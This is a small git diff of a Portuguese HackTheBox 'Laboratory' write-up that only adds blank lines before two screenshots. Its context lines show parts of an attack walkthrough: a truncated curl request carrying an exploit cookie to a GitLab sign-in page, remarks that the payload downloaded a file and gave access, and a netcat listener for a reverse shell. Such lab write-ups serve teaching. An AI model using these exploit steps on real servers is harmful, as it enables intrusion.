@@ -264,6 +264,7 @@ curl -k -vvv 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subj
 
 
 Ao enviar a requisição, podemos perceber que nosso payload funcionou e ele fez o download de nosso arquivo:
+
 ![Image](https://i.imgur.com/e8zztVj.png)
 
 
@@ -289,6 +290,7 @@ curl -k -vvv 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subj
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 E estamos dentro!
+
 ![Image](https://i.imgur.com/eweizzM.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 nc -vvnlp 1337
